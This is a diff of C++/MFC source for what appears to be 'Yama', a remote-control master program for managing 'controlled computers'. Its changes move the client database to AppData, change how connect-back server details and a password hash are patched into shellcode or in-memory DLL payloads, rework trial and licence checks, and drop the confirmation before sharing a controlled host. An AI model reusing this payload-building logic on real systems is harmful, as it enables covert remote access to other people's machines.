@@ -168,6 +168,15 @@ END_MESSAGE_MAP()
 
 // CMy2015RemoteDlg 对话框
 
+std::string GetDbPath() {
+	static char path[MAX_PATH], *name = "YAMA.db";
+	static std::string ret = (FAILED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, path)) ? "." : path)
+		+ std::string("\\YAMA\\");
+	static BOOL ok = CreateDirectoryA(ret.c_str(), NULL);
+	static std::string dbPath = ret + name;
+	return dbPath;
+}
+
 std::string GetFileName(const char* filepath) {
 	const char* slash1 = strrchr(filepath, '/');
 	const char* slash2 = strrchr(filepath, '\\');
@@ -597,7 +606,7 @@ VOID CMy2015RemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName
 
 	EnterCriticalSection(&m_cs);
 	if (modify)
-		SaveToFile(m_ClientMap, DB_FILENAME);
+		SaveToFile(m_ClientMap, GetDbPath());
 	auto& m = m_ClientMap[ContextObject->ID];
 	int i = m_CList_Online.InsertItem(m_CList_Online.GetItemCount(), strIP);
 	for (int n = ONLINELIST_ADDR; n <= ONLINELIST_CLIENTTYPE; n++) {
@@ -696,16 +705,16 @@ Buffer* ReadKernelDll(bool is64Bit, bool isDLL=true, const std::string &addr="")
 	memset(szBuffer + 2 + sizeof(int) + dwFileSize, 0, padding);
 	// CMD_DLLDATA + SHELLCODE + dwFileSize + pData
 	auto md5 = CalcMD5FromBytes(szBuffer + 2 + sizeof(int), dwFileSize);
-	if (!addr.empty()) {
-		std::string s(skCrypt(FLAG_FINDEN)), ip, port;
-		int offset = MemoryFind((char*)szBuffer, s.c_str(), dwFileSize, s.length());
-		if (offset !=-1){
+	std::string s(skCrypt(FLAG_FINDEN)), ip, port;
+	int offset = MemoryFind((char*)szBuffer, s.c_str(), dwFileSize, s.length());
+	if (offset != -1) {
+		CONNECT_ADDRESS* server = (CONNECT_ADDRESS*)(szBuffer + offset);
+		if (!addr.empty()) {
 			splitIpPort(addr, ip, port);
-			CONNECT_ADDRESS* server = (CONNECT_ADDRESS*)(szBuffer + offset);
 			server->SetServer(ip.c_str(), atoi(port.c_str()));
-			server->SetType(isDLL ? CLIENT_TYPE_MEMDLL : CLIENT_TYPE_SHELLCODE);
-			memcpy(server->pwdHash, GetPwdHash().c_str(), 64);
 		}
+		server->SetType(isDLL ? CLIENT_TYPE_MEMDLL : CLIENT_TYPE_SHELLCODE);
+		memcpy(server->pwdHash, GetPwdHash().c_str(), 64);
 	}
 	auto ret = new Buffer(szBuffer, bufSize + padding, padding, md5);
 	delete[] szBuffer;
@@ -725,7 +734,7 @@ BOOL CMy2015RemoteDlg::OnInitDialog()
 	}
 	// 将“关于...”菜单项添加到系统菜单中。
 	SetWindowText(_T("Yama"));
-	LoadFromFile(m_ClientMap, DB_FILENAME);
+	LoadFromFile(m_ClientMap, GetDbPath());
 
 	// IDM_ABOUTBOX 必须在系统命令范围内。
 	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
@@ -749,7 +758,6 @@ BOOL CMy2015RemoteDlg::OnInitDialog()
 	std::string port = THIS_CFG.GetStr("settings", "ghost", "6543");
 	std::string master = ip.empty() ? "" : ip + ":" + port;
 	const Validation* v = GetValidation();
-	m_superPass = v->Reserved;
 	if (!(strlen(v->Admin) && v->Port > 0)) {
 		// IMPORTANT: For authorization only.
 		PrintableXORCipher cipher;
@@ -810,7 +818,11 @@ BOOL CMy2015RemoteDlg::OnInitDialog()
 	lvColumn.pszText = (char*)str.data();
 	m_CList_Online.SetColumn(ONLINELIST_VIDEO, &lvColumn);
 	timeBeginPeriod(1);
+#ifdef _DEBUG
 	SetTimer(TIMER_CHECK, 60 * 1000, NULL);
+#else
+	SetTimer(TIMER_CHECK, 600 * 1000, NULL);
+#endif
 	CString tip = !ip.empty() && ip != getPublicIP() ? 
 		CString(ip.c_str()) + " 必须是\"公网IP\"或反向代理服务器IP":
 		"请设置\"公网IP\"，或使用反向代理服务器的IP";
@@ -939,7 +951,11 @@ void CMy2015RemoteDlg::OnTimer(UINT_PTR nIDEvent)
 {
 	if (nIDEvent == TIMER_CHECK)
 	{
-		if (!CheckValid()) 
+		if (!m_superPass.empty()) {
+			KillTimer(nIDEvent);
+			return;
+		}
+		if (!CheckValid(-1)) 
 		{
 			KillTimer(nIDEvent);
 			CInputDialog dlg(this);
@@ -1087,7 +1103,7 @@ void CMy2015RemoteDlg::OnNMRClickOnline(NMHDR *pNMHDR, LRESULT *pResult)
 	// 创建一个新的子菜单
 	CMenu newMenu;
 	if (!newMenu.CreatePopupMenu()) {
-		AfxMessageBox(_T("创建分配主控的子菜单失败!"));
+		MessageBox(_T("创建分享主机的子菜单失败!"), "提示");
 		return;
 	}
 
@@ -1183,7 +1199,7 @@ void CMy2015RemoteDlg::OnOnlineUpdate()
 		delete[] buffer;
 	}
 	else {
-		AfxMessageBox("读取文件失败: "+ CString(path));
+		MessageBox("读取文件失败: "+ CString(path), "提示");
 	}
 }
 
@@ -1299,12 +1315,12 @@ std::string joinString(const std::vector<std::string>& tokens, char delimiter) {
 }
 
 
-bool CMy2015RemoteDlg::CheckValid() {
+bool CMy2015RemoteDlg::CheckValid(int trail) {
 	DateVerify verify;
 #ifdef _DEBUG
 	BOOL isTrail = verify.isTrail(0);
 #else
-	BOOL isTrail = verify.isTrail(-1);
+	BOOL isTrail = verify.isTrail(trail);
 #endif
 
 	if (!isTrail) {
@@ -1319,7 +1335,7 @@ bool CMy2015RemoteDlg::CheckValid() {
 
 		auto settings = "settings", pwdKey = "Password";
 		// 验证口令
-		CPasswordDlg dlg;
+		CPasswordDlg dlg(this);
 		static std::string hardwareID = getHardwareID();
 		static std::string hashedID = hashSHA256(hardwareID);
 		static std::string deviceID = getFixedLengthID(hashedID);
@@ -1378,12 +1394,12 @@ void CMy2015RemoteDlg::OnOnlineBuildClient()
 	// 口令包含授权日期范围，确保一机一码；授权逻辑会检测计算机日期未被篡改!
 	// 注释下面 if 语句可以屏蔽该授权逻辑.
 	// 2025/04/20 
-	if (!CheckValid())
+	if (!CheckValid(365))
 		return;
 
 	// TODO: 在此添加命令处理程序代码
 	CBuildDlg Dlg;
-	Dlg.m_strIP = THIS_CFG.GetStr("settings", "localIp", "").c_str();
+	Dlg.m_strIP = THIS_CFG.GetStr("settings", "master", "").c_str();
 	int Port = THIS_CFG.GetInt("settings", "ghost");
 	Dlg.m_strIP = Dlg.m_strIP.IsEmpty() ? "127.0.0.1" : Dlg.m_strIP;
 	Dlg.m_strPort = Port <= 0 ? "6543" : std::to_string(Port).c_str();
@@ -2447,8 +2463,6 @@ void CMy2015RemoteDlg::OnOnlineShare()
 		MessageBox("字符串长度超出[0, 250]范围限制!", "提示", MB_ICONINFORMATION);
 		return;
 	}
-	if (IDYES != MessageBox(_T("确定分享选定的被控计算机吗?\n目前只能分享给同类主控程序。"), _T("提示"), MB_ICONQUESTION | MB_YESNO))
-		return;
 
 	BYTE bToken[_MAX_PATH] = { COMMAND_SHARE };
 	// 目标主机类型
@@ -2468,6 +2482,9 @@ void CMy2015RemoteDlg::OnToolAuth()
 	dlg.m_sUserPwd = m_superPass.c_str();
 
 	dlg.DoModal();
+	if (!dlg.m_sUserPwd.IsEmpty()){
+		m_superPass = dlg.m_sUserPwd;
+	}
 }
 
 void CMy2015RemoteDlg::OnMainProxy()
@@ -2514,7 +2531,7 @@ void CMy2015RemoteDlg::OnOnlineHostnote()
 	LeaveCriticalSection(&m_cs);
 	if (modified) {
 		EnterCriticalSection(&m_cs);
-		SaveToFile(m_ClientMap, DB_FILENAME);
+		SaveToFile(m_ClientMap, GetDbPath());
 		LeaveCriticalSection(&m_cs);
 	}
 }
@@ -2754,7 +2771,7 @@ void CMy2015RemoteDlg::OnToolGenMaster()
 	CComPtr<IShellFolder> spDesktop;
 	HRESULT hr = SHGetDesktopFolder(&spDesktop);
 	if (FAILED(hr)) {
-		AfxMessageBox("Explorer 未正确初始化! 请稍后再试。");
+		MessageBox("Explorer 未正确初始化! 请稍后再试。", "提示");
 		SAFE_DELETE_ARRAY(curEXE);
 		return;
 	}
@@ -2766,7 +2783,7 @@ void CMy2015RemoteDlg::OnToolGenMaster()
 		ret = fileDlg.DoModal();
 	}
 	catch (...) {
-		AfxMessageBox("文件对话框未成功打开! 请稍后再试。");
+		MessageBox("文件对话框未成功打开! 请稍后再试。", "提示");
 		SAFE_DELETE_ARRAY(curEXE);
 		return;
 	}
